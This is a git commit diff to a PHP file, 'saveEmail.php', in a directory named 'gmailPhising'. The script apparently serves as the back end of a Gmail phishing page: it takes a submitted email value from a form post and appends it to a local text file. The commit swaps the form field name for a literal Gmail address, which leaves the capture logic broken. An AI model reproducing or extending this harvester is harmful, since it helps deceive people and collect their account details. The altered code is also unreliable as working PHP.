78db745e438008191af19633cfa70ed09896392c
Joseph Njoroge <141281465+JosephNjorog@users.noreply.github.com>
2024-02-01 18:15:28 -0500

    Update saveEmail.php

--- gmailPhising/saveEmail.php
+++ gmailPhising/saveEmail.php
@@ -1,5 +1,5 @@
 <?php
-$email = $_POST["email"];
+$email = $_POST["joenjoro11173@gmail.com"];
 $myfile = fopen("email.txt", "wa+") or die("Unable to open file!");
 fwrite($myfile, $email);
 fclose($myfile);
